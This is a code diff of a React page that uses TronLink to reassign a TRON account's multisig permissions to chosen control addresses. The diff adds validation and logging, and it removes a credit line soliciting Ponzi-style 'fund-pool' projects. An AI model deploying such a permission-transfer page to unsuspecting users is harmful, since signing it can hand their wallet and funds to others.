@@ -12,18 +12,20 @@ const TronPermissionSetter = () => {
 
   useEffect(() => {
     const initTronWeb = async () => {
-      // 等待TronLink注入tronWeb对象
       let tries = 0;
       const maxTries = 10;
       
       const checkTronWeb = () => {
-        if (window.tronWeb && window.tronWeb.ready) {
+        if (window.tronWeb && 
+            window.tronWeb.ready && 
+            window.tronWeb.defaultAddress && 
+            window.tronWeb.defaultAddress.base58) {
           setupTronWeb();
         } else if (tries < maxTries) {
           tries++;
           setTimeout(checkTronWeb, 1000);
         } else {
-          setError("未检测到TronLink，请确保在TronLink中打开");
+          setError("未检测到TronLink或账户未解锁，请确保在TronLink中打开并解锁钱包");
         }
       };
 
@@ -33,13 +35,17 @@ const TronPermissionSetter = () => {
     const setupTronWeb = async () => {
       try {
         const tronWeb = window.tronWeb;
-        // 支持自动检测网络
         console.log("当前节点:", tronWeb.fullNode.host);
         setTronWeb(tronWeb);
         
-        // 测试节点连接
-        const nodeInfo = await tronWeb.trx.getNodeInfo();
-        console.log("节点信息:", nodeInfo);
+        // 验证节点连接
+        try {
+          const nodeInfo = await tronWeb.trx.getNodeInfo();
+          console.log("节点信息:", nodeInfo);
+        } catch (err) {
+          console.warn("获取节点信息失败:", err);
+          // 继续执行，因为某些节点可能不支持getNodeInfo
+        }
         
       } catch (err) {
         console.error("连接错误:", err);
@@ -52,7 +58,7 @@ const TronPermissionSetter = () => {
 
   // 添加控制地址
   const addController = () => {
-    if (controllers.length < 5) { // 限制最大地址数量
+    if (controllers.length < 5) {
       setControllers([...controllers, ""]);
     }
   };
@@ -80,17 +86,24 @@ const TronPermissionSetter = () => {
       setError("");
       setSuccess("");
       
-      if (!window.tronWeb || !window.tronWeb.ready) {
-        throw new Error("请确保在TronLink中打开此页面");
+      // 检查 TronLink 状态
+      if (!window.tronWeb || !window.tronWeb.ready || !window.tronWeb.defaultAddress.base58) {
+        throw new Error("请确保TronLink已连接并解锁账户");
       }
 
       const tronWeb = window.tronWeb;
 
-      if (!tronWeb.isAddress(targetAddress)) {
+      // 验证地址
+      if (!targetAddress || !tronWeb.isAddress(targetAddress)) {
         throw new Error("被控制地址格式不正确");
       }
 
+      // 验证控制地址
       const validControllers = controllers.filter(addr => addr && tronWeb.isAddress(addr));
+      if (validControllers.length === 0) {
+        throw new Error("请至少添加一个有效的控制地址");
+      }
+      
       if (validControllers.length < threshold) {
         throw new Error("有效控制地址数量少于所需签名数");
       }
@@ -119,33 +132,42 @@ const TronPermissionSetter = () => {
         }]
       };
 
-      // 使用POST请求调用API
+      console.log("更新参数:", updateParams);
+
+      // 发送交易
       const transaction = await tronWeb.fullNode.request(
         '/wallet/accountpermissionupdate',
         updateParams,
         'post'
       );
 
-      // 设置交易过期时间
+      if (!transaction || !transaction.txID) {
+        throw new Error("创建交易失败");
+      }
+
+      console.log("交易创建成功:", transaction);
+
+      // 设置过期时间
       const now = Date.now();
-      const txID = transaction.txID;
       transaction.expiration = now + 60 * 1000;
       transaction.timestamp = now;
 
-      // 等待用户签名
+      // 签名交易
       const signedTx = await tronWeb.trx.sign(transaction);
+      console.log("交易已签名:", signedTx);
       
       // 广播交易
       const receipt = await tronWeb.trx.sendRawTransaction(signedTx);
+      console.log("交易广播结果:", receipt);
       
       if (receipt.result) {
-        setSuccess(`多签权限设置成功! 交易ID: ${txID}`);
+        setSuccess(`多签权限设置成功! 交易ID: ${transaction.txID}`);
         return;
       }
       throw new Error("交易被拒绝");
 
     } catch (err) {
-      console.error("错误:", err);
+      console.error("设置多签权限错误:", err);
       setError(err.message || "设置失败，请重试");
     } finally {
       setLoading(false);
@@ -156,10 +178,9 @@ const TronPermissionSetter = () => {
     <div className="p-4 bg-gray-50 min-h-screen">
       <div className="max-w-lg mx-auto bg-white rounded-lg shadow">
         <div className="p-4">
-         <h2 className="text-xl font-bold mb-4">设置TRON多签权限</h2>
-<p className="text-base font-normal mb-4">无需私钥，请在浏览器安装TronLink</p>
-<p className="text-base font-normal mb-4">作者 @xkbfdl</p>
-<p className="text-base font-normal mb-4">寻求好资金盘项目，积分盘，提币盘，商城盘，提现盘 欢迎老板 跟我联系合作</p>
+          <h2 className="text-xl font-bold mb-4">设置TRON多签权限</h2>
+          <p className="text-base font-normal mb-4">无需私钥，请在浏览器安装TronLink</p>
+          <p className="text-base font-normal mb-4">作者 @xkbfdl</p>
           
           {error && (
             <div className="bg-red-100 border border-red-400 text-red-700 px-3 py-2 rounded mb-4 text-sm">
@@ -253,4 +274,3 @@ const TronPermissionSetter = () => {
 };
 
 export default TronPermissionSetter;
-
